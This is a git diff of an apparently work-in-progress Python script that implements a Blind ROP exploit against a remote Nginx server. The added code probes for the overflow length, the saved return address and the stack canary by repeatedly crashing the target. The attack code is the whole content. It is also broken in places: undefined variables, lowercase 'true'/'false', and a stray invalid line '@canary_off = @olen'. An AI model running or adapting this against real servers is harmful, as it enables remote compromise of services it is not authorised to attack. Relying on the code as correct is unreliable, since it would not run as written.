@@ -4,9 +4,21 @@ import argparse
 from time import sleep
 import struct
 
+#Default address of text segment set by linked on linux
+#also win32 executables
+TEXT =  0x400000
+
 overflow_len = 0
-#No idea wtf this is
-origin = None
+#How many instructions between buffer end and RIP
+pad = 0
+#Where the vulnerable function was called from
+rip = None
+#Not entirely sure of purpose of this...back to the paper
+large_text = None
+guard = None
+
+#Stack canary
+canary = None
 
 class Nginx:
 	def __init__(self,ip,port):
@@ -111,11 +123,10 @@ def find_overflow_len(target):
 	print "Found overflow length - it is: " + str(overflow_len) + " bytes!"
 
 def found_rip(word):
-	TEXT	    =  0x400000
 	limit = TEXT + 0x600000
 
+	#If a pointers within this limit we can assume its an instruction pointer
 	if TEXT < w < limit:
-		origin = TEXT
 		return true
 
 	return false
@@ -132,9 +143,17 @@ def find_rip(target):
 			words = [0 for i in words]
 			continue
 		if not found_rip(w):
+			words.append(w)
 			continue
-		print "FOUND RIP"
+		pad = len(words) - 1
+		rip = w
+		large_text = (rip - TEXT) > 1024 **2
+		guard = rip
+		print "Found RIP - it is " + str(rip)
 		break
+	#We're starting with a buffer thats just short of crashing the process, this means its almost a given that the next word is the stack canary
+	check_canary(words)
+
 def stack_read_word(payload,target):
 	word = ""
 
@@ -155,7 +174,28 @@ def stack_read_byte(payload,target):
 		if r == "NOCRASH":
 			return i
 	return None
+def check_canary(words):
+	if len(words) == 0:
+		return
+	canary = words[0]
 
+	if (canary & 0xff) != 0:
+		return
+
+	zeros = 0
+
+	for i in range(8):
+		b = (canary >> (i*8)) & 0xff
+		if b == 0:
+			zeros += 1
+
+	if zeros > 2:
+		return
+
+	print "Possible canary " + str(canary)
+
+	canary = canary
+	@canary_off = @olen
 def brop():
 	parser = argparse.ArgumentParser(description='Attempts to create an exploit given only a method to crash a remote service.')
 	parser.add_argument('-ip', help='ip address of target system')
